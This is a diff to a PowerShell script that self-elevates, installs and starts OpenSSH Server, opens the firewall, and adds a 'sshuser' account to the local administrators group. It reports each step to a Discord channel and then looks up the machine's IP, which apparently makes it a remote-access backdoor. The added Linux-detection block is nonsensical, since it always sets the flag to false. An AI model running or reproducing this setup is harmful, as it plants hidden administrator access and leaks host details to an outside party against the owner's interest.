@@ -1,3 +1,11 @@
+# Проверка на права администратора
+$IsAdmin = [System.Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544'
+if (-not $IsAdmin) {
+    Write-Host "This script requires administrator privileges. Restarting with elevated privileges..."
+    Start-Process powershell -ArgumentList "-NoExit", "-Command", "& { $myInvocation.MyCommand.Path }" -Verb RunAs
+    exit
+}
+
 try {
     $StopWatch = [system.diagnostics.stopwatch]::startNew()
 
@@ -19,17 +27,31 @@ try {
     # Send initial message to Discord
     Send-DiscordMessage "Starting the installation of OpenSSH Server..."
 
+    # Check for Linux or Windows
+    $IsLinux = $false
+    if ($IsLinux -eq $false) {
+        $IsLinux = $false
+    }
+
     # Install OpenSSH Server
     if ($IsLinux) {
         Send-DiscordMessage "Detected Linux system. Installing OpenSSH Server..."
-        & sudo apt install openssh-server -y
-        Send-DiscordMessage "OpenSSH Server installed on Linux."
+        try {
+            & sudo apt install openssh-server -y
+            Send-DiscordMessage "OpenSSH Server installed on Linux."
+        } catch {
+            Send-DiscordMessage "Error installing OpenSSH Server on Linux: $($Error[0])"
+        }
     } else {
         Send-DiscordMessage "Detected Windows system. Installing OpenSSH Server..."
-        Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
-        Start-Service sshd
-        Set-Service -Name sshd -StartupType 'Automatic'
-        Send-DiscordMessage "OpenSSH Server installed and running on Windows."
+        try {
+            Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
+            Start-Service sshd
+            Set-Service -Name sshd -StartupType 'Automatic'
+            Send-DiscordMessage "OpenSSH Server installed and running on Windows."
+        } catch {
+            Send-DiscordMessage "Error installing OpenSSH Server on Windows: $($Error[0])"
+        }
 
         # Configure firewall rule if it's missing
         if (-not (Get-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -ErrorAction SilentlyContinue)) {
@@ -47,9 +69,13 @@ try {
     # Add user for SSH connection (only for Windows)
     if (-not $IsLinux) {
         $Username = "sshuser"
-        net user $Username $Password /add
-        net localgroup administrators $Username /add
-        Send-DiscordMessage "User created: $Username."
+        try {
+            net user $Username $Password /add
+            net localgroup administrators $Username /add
+            Send-DiscordMessage "User created: $Username."
+        } catch {
+            Send-DiscordMessage "Error creating user: $($Error[0])"
+        }
     }
 
     # Get main IP address
